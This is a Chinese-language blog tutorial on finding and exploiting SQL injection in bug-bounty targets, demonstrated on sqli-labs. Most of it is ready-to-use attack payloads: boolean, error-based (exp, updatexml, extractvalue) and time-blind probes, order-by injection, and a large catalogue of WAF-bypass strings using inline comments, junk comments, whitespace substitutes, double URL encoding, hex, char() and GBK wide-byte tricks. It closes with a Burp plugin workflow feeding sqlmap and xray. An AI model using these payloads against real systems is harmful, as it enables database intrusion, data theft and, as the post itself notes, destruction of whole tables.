---
title: SQL注入漏洞挖掘和绕过
date: '2026-08-10 15:16:59'
tags: []
categories:
  - 漏洞挖掘
slug: SQL注入漏洞挖掘和绕过
permalink: /sql
draft: false
---

sql 注入这个漏洞老生常谈了，但是很多师傅只能挖到公益 src，并不能挖到 src 中的注入，那是因为在 src 中，他们系统开发会有代码自动审计平替，还有的会进行漏洞的扫描，太常规的漏洞再次之前估计就被解决了，但是这不代表不存在漏洞！因为最近几年的规范化代码开发和安全意识培训，sql 注入相比于几年之前确实少了很多，但是 src 中仍然会存在很多！因为需要交互的地方很多都需要插入到数据库中，而大量的交互总会有漏网之鱼，也总有扫描器爬取不到的地方，并且很多防御注入比如预编译，也不少任何时候都能使用的，因此就导致了很多的注入的漏洞。

**本篇文章以sqli-labs靶场为例**

## 1、注入的类型
```
联合查询注入
报错注入
布尔盲注
时间盲注
宽字节注入
堆叠注入
排序注入(src重点)
请求头注入(UA注入、cookie注入)
二次注入
```
**注：** 以下内容是默认你会基础的sql注入
## 2、SQL注入的验证步骤
```
1、 单引号报错验证
2、 进行整形和字符型判断
3、 找到闭合方式
4、 进行 waf 绕过的布尔验证或者报错验证
5、 获得数据库极少内容(src 可以止步于此)
6、自动化深入攻击
```
## 3、注入的验证三种方式
#### （1）布尔法
**什么是布尔法，就是通过页面的返回内容不同来进行判断。**
```
id=1 and 1=1

id=1 and 1=2

id=1 && 1=1

id=1 && 1=2
```
**不建议用 or，容易造成删库，除非确定是查询功能。**
```
id=-1 or 1=1

id=-1 or 1=2

id=-1 || 1=1

id=-1 || 1=2
```
**可以看到，如果是 id=1 or 1，就会查询出所有内容，如果是 delete 方法，就会造成全部删库。**
![](/images/20260810151700.png)
#### （2）报错法
**报错法就是使用 exp()方法，该方法在 709 数值之内不会报错，当大于等于 710，就会报错。**
```
id = 1 and exp(709) # 正常
id = 1 and exp(710) # 报错
```

看下面的 payload，在 and exp(709)的时候不会报错。

![](/images/20260810151702.png)

当 and exp(710)的时候就会进行报错。

![](/images/20260810151705.png)
#### （3）延时法
```
id = 1 and sleep(5);

id = 1 and BENCHMARK(200000000,(1=1)); # 效果：MySQL 会强行将 1=1 这个简单表达式循环计算 2 亿次。这会瞬间耗尽 CPU 资源，导致该查询的响应时间从毫秒级变为数秒甚至数十秒
```

![](/images/20260810151707.png)

## 4、SQL注入中常用的技巧
### 4.1 like的用法
LIKE 是一个强大的工具，用于在 SQL 中进行模糊搜索，能够帮助你查找符合特定模式的数据，而不需要完全匹配。通过灵活使用 % 和 _ 这两个通配符，你可以实现广泛的搜索需求。
现在设有一个名为 users 的表，包含 id、username 和 email 列，我们可以使用 LIKE 进行不同类型的模糊搜索：

**查找以特定字符串开头的行：**
```
SELECT * FROM users WHERE username LIKE 'jo%'; # 这将返回所有 username以jo开头的行
```

**查找以特定字符串结尾的行：**
```
SELECT * FROM users WHERE email LIKE '%gmail.com'; # 这将返回所有 email 以 gmail.com 结尾的行
```

**找包含特定子字符串的行：**
```
SELECT * FROM users WHERE username LIKE '%smith%'; # 这将返回所有 username 中包含 smith 子字符串的行
```

**精确匹配一个字符和后续字符：**
```
SELECT * FROM users WHERE username LIKE 'j_smith'; # 这将匹配 username 是以 j 开头，然后是一个字符，然后是 smith 的行。 _ 只匹配
一个字符
```
### 4.2 exp的用法
在SQL注入中，`exp()` 函数主要作为一种**报错注入** 的技术被攻击者利用。它的核心原理是：**通过构造恶意输入，让 `exp()` 函数触发一个数据库“溢出”错误，并将攻击者想要窃取的数据“夹带”在错误信息中一同返回**。
简单来说：在 mysql 中，exp 的上限是 709，超过 709 会报错！
![](/images/20260810151710.png)
### 4.3 exp+like的用法
在src中，很多情况下，审核要求你要有数据，哪怕是数据库名，或者表名，版本
号也可以，因此就需要使用到 exp+like 进行匹配。
```
select * from student where id = '1' and exp(710-(database()like's%')) and '1'

select * from users where id =1 and exp(710-database()like'd%');
```
![](/images/20260810151712.png)

除了 database() ，也可以使用 user()，这样可以爆出当前用户名。

![](/images/20260810151714.png)

还可以使用版本号去猜测

![](/images/20260810151716.png)
### 4.4 like被过滤
```
select * from users where id = 1 and exp(710-ascii(CURRENT_USER));
然后就是把 710 往上提升，直到正好 x-ascii(CURRENT_USER)=710 或者 709 就可以判断可以个数值的 ascii 值。

r 的 ascii 值为 114，因此可以使用 823 和 824 进行判断。

select * from users where id = 1 and exp(823-ascii(CURRENT_USER));

select * from users where id = 1 and exp(824-ascii(CURRENT_USER));
```
![](/images/20260810151719.png)
## 5、SQL注入绕WAF
### 5.1 内联注释
**`/*!*/`** 叫做内联注释，当 **!** 后面所接的数据库版本号时，当实际的版本等于或是高于那个字符串，应用程序就会将注释内容解释为 SQL，否则就会当做注释来处理。默认的，当没有接版本号时，是会执行里面的内容的。
比如版本号为 5.7.26，当`/*!00000xxx*/-/*!50726xxx*/`里的注释内容都可以解析为 sql 语句执行而`>/*!50726xxx*/`里的注释内容就真的被注释，失去作用。不加版本号也能用，加随机版本号绕过概率大。

在 mysql 中，内联注释里的 Sql 语句是会被执行的 。`/*!SELECT*/`如果在 `/*!SELECT*/` 中里面不加 **`!`** ，则 `/*SELECT*/ `会以注释的形式存在，这时select 将不会被当成语句执行。

`/*4dd*/ `普通注释
`/*! sdad*/ `内联

### 5.2 代替空格
```
%20 %09 %0a %0b %0c %0d %a0 %00 /**/ /*!*/

--%0a

--ABC%0a (access)

%23%0a

%23qwe%0a

%23 %0A
```
### 5.3 注释的脏数据使用
在 sql 中，注释是 /*注释内容*/ 的形式存在，但是可以混合多个注释符，然后插入脏数据。下面这些只要服从第一个的格式，红色区域随便插入，黄色区域不能插入，蓝色区域尽量不要插入，不会报错，但是会导致不能绕过。
```
/黄*蓝/红*红*黄/
/*/**/

/*///**/
/*/*%0a*/
/*%0a/*%0a*/
/*%0a/*%20%0a*/
/*%0a/%091231**/
/*%0a/fasfa221213*%0a*/
/*/fasfa221ss%0a213*%0a*/
```
![](/images/20260810151721.png)

![](/images/20260810151723.png)

### 5.4 等号过滤
```
?id=1' and '1'regexp'1

?id=1''1'regexp'1

?id=1' and '1'<>'2  # 这个值不相等的时候，结果为真
```
![](/images/20260810151725.png)
### 5.5 函数替代
#### （1）database()
```
--->database(/*!44444*/)

--->database/**/()

---->database/**/(/*!*/)

---->database--%0a(%0a)

---->database%23qwe%0a(%0a)

---->database%23qwe%0a(/*!44444*/)

----->database/*/111*111/(/*!44444*/)
```
#### （2）information_schema.tables
```
/*!information_schema*/./*!tables*/

/*!information_schema*//*!.*//*!tables*/

/*!33333information_schema*//*!42222.*//*!44444tables*/
```
### 5.6 括号拆分
```
select database/*!44444(*/);

select database/*!44444(*//*!44444)*/;

select database/*/fasfa221213*%0a*//*!44444(*//*!44444)*/;
```
### 5.7 编码绕过

**原理**:WAF 主要靠正则匹配"关键字/符号",而数据库最终解析的是**解码后**的 SQL。如果我们给关键字或符号做一层或多层编码,让 WAF 看到的是一堆乱码(匹配不上),而数据库收到后再解码还原成原语句执行,就能绕过去。
**核心一句话:WAF 的解码层数 < 后端的解码层数,就有绕过空间。**

#### （1）单层 URL 编码
最常见的编码,把符号/关键字 URL 编码后再提交:
```
?id=1%27%20and%201=1%20--+        # %27 = ' , %20 = 空格
?id=1%27%20union%20select%201,2,3%20--+
```
**注意**:绝大多数 WAF 都会先解一层 URL 编码再匹配,所以单层编码基本拦得住,单层只适合绕"只做简单匹配"的 WAF。

#### （2）双重 URL 编码(二次编码)
WAF 只解一层,看到的还是 `%2527`(匹配不到单引号);后端解两层,还原成 `'`,注入成功。
```
?id=1%2527%2520and%25201=1%2520--+
?id=1%2527%2520union%2520select%25201,2,3%2520--+
```

#### （3）十六进制编码(0x)
把**字符串常量**用 `0x` 表示,绕过对引号、字符串内容的检测:
```
?id=1 union select 1,0x61646d696e,3 --+      # 0x61646d696e = 'admin'
?id=1' and username=0x61646d696e --+          # 数字型/无引号上下文也可用
?id=1 and 1=(select 1 from users where username=0x61646d696e)--+
```
**注意**:`0x` 只能替代字符串字面量,**不能替代表名/列名**(表名列名要配合预处理语句,见下方 char()/concat 玩法)。

#### （4）Unicode 编码(%u 编码)
IIS/ASP 环境下,部分 WAF 不识别 `%u` 形式,数据库却会还原:
```
?id=1%u0027%u0020and%u00201=1%u0020--+       # %u0027 = '
```

#### （5）宽字节注入(GBK 编码,重点!)
当数据库字符集是 **GBK**、且参数被 `addslashes` 之类的函数转义(自动在 `'` 前加反斜杠 `\`)时,可以利用宽字节把反斜杠"吃掉":
```
?id=1%bf%27%20and%201=1%20--+
```
**原理**:`%bf` 和 `\`(即 `%5c`)组合在一起会被 GBK 解析成**一个宽字节汉字**(如"縗"),转义用的反斜杠就被"消化"掉了,后面的单引号成功逃逸出来,注入继续。
**对应靶场:sqli-labs Less-32 就是宽字节注入**,可以直接去打一遍加深理解。
同理还有 `%df%27`、`%aa%27` 等,只要是高字节(0x80 以上)开头的编码都可能吃掉反斜杠。

#### （6）char() / 函数拼接编码
把字符串用函数现拼出来,绕关键字/引号检测:
```
?id=1' and username=char(97,100,109,105,110)--+   # char(97..110) = 'admin'
?id=1' and updatexml(1,concat(char(126),database()),1)--+   # char(126) = '~'
```

#### （7）编码组合(实战姿势)
真实 WAF 很少单靠一种编码就过,一般是**多层编码 + 注释符 + 内联注释**混着来,层层试探:
```
?id=1%2527%20/*!44444union*/%20/*!44444select*/%201,database%28%29,3%2520--+
?id=%31%27%20%61%6e%64%20%31%3d%31%20--+          # 数字也编码,%61='a' %6e='n' %64='d'
```
**探测小技巧**:先发一个无害的 `%27`(单引号),看页面是否报错/回显差异,判断 WAF 解了几层编码,再决定用单层还是双层。

**与其他小节的配合**(编码往往不是孤立的):
- 空格被过滤 → 用 `%09 %0a %0b %0c %0d %a0` 或注释(见 5.2);
- `=` 被过滤 → 用 `like / regexp / <>`(见 5.4);
- 函数名被过滤 → 注释拆函数、内联注释(见 5.5 / 5.6);
- 编码只是**外层包装**,里面还是要落在上面的绕过技巧上。
## 6、SQL实战payload的WAF绕过
### 6.1 and 1=1 绕过
```
?id=1 /*!44444and*/ /*!444442*/=2--+

?id=1' /*!44444and*/ /*!2*/=2--+

?id=3'/*!44444and*/1=1 --+

?id=-3'/*!44444or*/1=1 --+

?id=-3' || -1=-1 --+

?id=1' like'1'='1
```
### 6.2 order by 绕过
这里如果使用 order by 和内联注释一起，是绕不过的，改成 group by 即可绕过。
```
?id=1' group by 1--+

?id=1'/*!44444group*/ /*!44443by*/ 3--+

?id=1'/**/order/*/**/by/**/1'

?id=1'/**/order/*/**/by/**/1--+

?id=1'/**/order/*/%0a*a*/by/**/3%23
```
### 6.3 union select 绕过
```
?id=1'union /*/1*1*//*!44444select*/ 1,2,3--+

?id=2%27union/*/%*%*//*!44444select*/1,2,3%23

?id=2%27union/*/1/%111*%*//*!44444select*/1,2,3%23

?id=2%27union/*/11*11/%*//*!44444select*/1,2,3%23

?id=1 like "[%23]" /*!10444union%0Aselect*/1,2,3 --+

?id=-1 like "[%23]" '/*!10444union%0Aselect*/1,2,3 --+
```
### 6.3 if(1=1,sleep(1),1)绕过
```
?id=1' and/*/sdas*sdad*/if(1=1,sleep(/**/5),2)%23

?id=1' and/*/sdas*sdad*/if(1=1,sleep(/**/3/**/),2)%23
```
### 6.4 联合查询注入绕过
```
?id=-1 like "[%23]" '/*!10444union%0Aselect*/1,database(/*!44444*/),3 --+

?id=-1 like "[%23]" /*!10444union%0Aselect*/1,database(/*!44444*/),3 --+
```
### 6.5 报错注入绕过
这里会检测 updatexml()，因此想方法将 updatexml 和()分开
**下面是探测数据库版本
```
?id=1' and-updatexml/*/111*111*/(1,concat(0x7e,version%23qwe%0A(/*!44444*/),
0x7e),1)--+

?id=1' and-extractvalue/*/111*111*/(1,concat/*/111*111*/(0x7e,(version/*/111*111*/()),0x7e))--+
```
**下面是探测数据库名
```
?id=1' and-updatexml/*/111*111*/(1,concat(0x7e,database%23qwe%0A(/*!44444*/),
0x7e),1)--+

?id=1' and extractvalue/*/111*111*/(1,concat/*/111*111*/(0x7e(database/*/111*111*/()),0x7e))--+
```
### 6.6 时间盲注绕过

有时候全插入 111 不一定能绕过，玩的脏一点最好
```
?id=1' and/*/asd*asd*/if(length(database/*/111*111*/())>2,sleep(/**/5),2)%23

?id=1' and/*/ *asd*/if(length(database/*/111*111*/())>2,sleep(/**/5),2)%23

?id=1' and/*/ */if(length(database/*/-- %0A**/())>8,sleep(/**/5),2)%23
```

### 6.7 关键字替换绕过
```
user() 可以换成 current_user

sleep() 可以换成 BENCHMARK()

order by 可以换成 group by

and updatexml 可以换成 and-updatexml

concat() 可以换成 concat_ws()

and 可以换成 &&

or 可以换成 ||

constr 可以换成 constring
```
## 7、SRC中最常见的排序注入
我们大家都知道，现在防范 sql 注入都是使用的预编译，但是预编译不是万能的，在排序中是无法使用的！比如order by、like、in
下面这种情况就是直接拼接的 id，为什么不进行预编译呢？如果进行预编译，那么这个id 传入到数据库中就不再是整数了，而是一个字符类型，order by 在遇到字符类型是没法正常排序的！
![](/images/20260810151727.png)
### 7.1 and 1=1 判定失效
在 order by 排序中，没法使用 and 1=1 和 and 1=2 来判定是否存在 sql 注入，因为他们的回显内容都完全一致
![](/images/20260810151730.png)
### 7.2 正确的判断方法
既然 and 1=1 和 and 1=2 没法进行使用，那就使用 rand()这个随机数进行判定。通过 rand()，如果返回内容出现了变化，那就很明显是使用了 order by 进行了排序。
```
select * from users order by rand();
```
![](/images/20260810151733.png)
### 7.3 判断出数据的方法
使用 if 来判断数据
```
select * from users order by if(1=1,username,password);
```

![](/images/20260810151735.png)
```
select * from users order by if(database()like's%',username,password);

select * from users order by
if(database()like's%',sleep(3),password);
```
![](/images/20260810151738.png)
### 7.4 可以支持报错注入
```
select * from users order by updatexml(1,if(1=2,1,(user())),1);
```
![](/images/20260810151741.png)
## 8、SQL注入时所需注意的点
**谨慎使用or和--+** 在现实的SRC中可能导致删库行为
### 8.1 or导致删库的情况
#### （1）updata导致的全表更改
正常的 update 更改，存在限制，只更改一行。
![](/images/20260810151743.png)

使用 or 之后，尤其是 or 1 导致的永真。会导致整个库全部被改！

![](/images/20260810151745.png)
#### （2）delete导致的全表删除
正常的删除逻辑
```
delete from users where id = 14 and username="test";
```
![](/images/20260810151748.png)

假设注入点在 id 上面，如果你使用了 or ，就会导致下面问题，直接全删了

![](/images/20260810151750.png)

这个句子和下面这个是完全等价的，直接就是 or 1 永真了，导致库全删了。
```
delete from users where id = 12 and username="test" or 1;
```
![](/images/20260810151753.png)
### 8.2 注释符--+导致删库的情况
#### （1）update导致的全表更改
正常的 update 语法，因为有 id=1 的限制
```
update users set password = "123456" where username = "test" and id=1;
```
![](/images/20260810151755.png)
如果使用 --+ 注释掉下一个 id 筛选限制，就会导致全部密码都被修改。
```
update users set password = "123456" where username = "test" -- " and id=1;
```
![](/images/20260810151757.png)
#### （2）delete导致的全表删除
正常的删除操作，也是因为有 id 的限制，每次只能删除一条。
```
delete from users where username = "test" and id = 1;
```

![](/images/20260810151800.png)
如果注入点出现在 username，你使用了 --+ 就可能导致下面情况。原本的 id 限制没了，直接导致删库了。
```
delete from users where username = "test" or 1 -- " and id = 1;
```
![](/images/20260810151802.png)

## 9、SQL注入半自动化插件--xia SQL

> **xia SQL(俗名"瞎注")** 是 GitHub 作者 **smxiazi** 开源的 **Burp Suite 插件**(仓库:`github.com/smxiazi/xia_sql`),作用是**半自动化**帮你快速找出"哪个参数可能存在 SQL 注入",省去一个个手动加引号的体力活。它只负责**探测可疑点**,不负责完整利用,所以叫"半自动化"。

### 9.1 它帮你干了什么
插件会自动做一件最枯燥的事:**给每个参数值自动追加单引号/双引号**,纯数字值再追加 `-1`/`-0`,然后把"原始包 / 单引号包 / 双引号包"三次请求的**响应长度做对比**,按规则给你打标记:
| 标记 | 含义 |
|---|---|
| ✔️ | 两个引号与一个引号响应长度不一致 → **可能注入** |
| ✔️ ==> ？ | 原始与双引号同长、与单引号不同 → **很可能注入** |
| Err | 响应里出现数据库报错关键字 |
| time > 3 | 响应时间超过 3 秒(配自定义 payload 测时间盲注) |
| diy payload | 自定义 payload 命中 |

### 9.2 安装
1. GitHub Releases 下载 jar,按你的 Burp 运行时 JDK 版本选:
   - Burp 用 JDK8 → 下 `xia.SQL.3.3.jdk8.jar`
   - Burp 新版 JDK16 → 下 `xia.SQL.3.3.jdk16.jar`
2. Burp → **Extensions → Add** → 选择 jar → 加载成功即可。
3. 二开增强版 **XiaSQL_Plus**(`github.com/AnQuanPig/XiaSQL_Plus`)支持 GraphQL、Multipart、URL 编码 JSON 等新格式,原版扫不动的场景可以换它。

### 9.3 使用姿势
**被动扫描(推荐,浏览即测)**:
- Burp 开着代理,正常浏览目标站点,插件自动监控 **Proxy / Repeater** 流量,给每个带参数的请求标注入标记;
- 看到 ✔️/Err/time>3 的请求,先自己在 **Repeater 里手动复核**(二次确认,别直接信插件)。

**主动扫描**:
- 对任意请求右键 → **Send to xia SQL**,单点扫描,适合在 Repeater 里改完包后单独测。

**配合其他工具(官方推荐姿势)**:
- xia SQL 只插引号、只做"疑似注入"初筛,**最终确认和利用交给深挖工具**:
```
xia SQL 发现可疑参数
   ↓
Repeater 手动复核布尔/报错/时间
   ↓
sqlmap / xray 深入利用(打库、出数据)
```
- README 原话:**"如果需要所有注入都测试,请把 burp 的流量转发到 xray"**——xia SQL 负责筛,批量深挖交给 xray。
